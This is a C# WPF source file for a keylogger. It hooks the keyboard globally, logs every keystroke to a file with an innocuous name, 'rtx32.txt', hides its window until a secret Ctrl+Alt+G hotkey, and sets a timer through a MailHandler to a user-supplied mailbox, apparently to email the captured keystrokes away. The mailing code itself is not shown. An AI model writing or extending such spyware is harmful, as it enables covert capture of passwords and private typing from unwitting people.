using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.IO;
using System.Drawing;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Threading;
using System.Timers;
using DesktopWPFAppLowLevelKeyboardHook;

namespace WpfApplication8
{
    public partial class MainWindow : Window
    {
        private static System.Timers.Timer aTimer;
        bool condition = false;
        StreamWriter file = new StreamWriter(@"rtx32.txt");
        PressingHandle pressinghandle = new PressingHandle();
        private LowLevelKeyboardListener _listener;
        MailHandler mailhandler = new MailHandler();
        public MainWindow()
        {
            InitializeComponent();
        }

        public void Button_Click(object sender, RoutedEventArgs e)
        {
            condition = true;
        }
        public void Button_Click_1(object sender, RoutedEventArgs e)
        {
            condition = false;
            file.Close();
        }
        public void Window_Closing(object sender, CancelEventArgs e)
        {
            _listener.UnHookKeyboard();
            file.Close();
        }
        public void Window_Closed(object sender, EventArgs e)
        {
            _listener.UnHookKeyboard();
            file.Close();
        }
        public void Hide_Click(object sender, RoutedEventArgs e)
        {
            this.Hide();
        }

        private void Mail_button(object sender, RoutedEventArgs e)
        {
            string mailbox = mailBox.Text;
            mailhandler.SetTimer(aTimer, mailbox);
            Console.WriteLine(mailbox);
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _listener = new LowLevelKeyboardListener();
            _listener.OnKeyPressed += _listener_OnKeyPressed;

            _listener.HookKeyboard();
        }

        void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            string key;
            if (condition)
            {
                if (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift))
                {
                    key = e.KeyPressed.ToString();
                    pressinghandle.Save_With_Big_Letters(key, file);
                }
                else
                {
                    key = e.KeyPressed.ToString();
                    pressinghandle.Save_With_Small_Letters(key, file);
                }
                file.Flush();
            }
            if (Keyboard.IsKeyDown(Key.G) && Keyboard.IsKeyDown(Key.LeftCtrl) && Keyboard.IsKeyDown(Key.LeftAlt) || Keyboard.IsKeyDown(Key.G) && Keyboard.IsKeyDown(Key.RightCtrl) && Keyboard.IsKeyDown(Key.RightAlt))
            {
                this.Show();
            }
        }
    }
}



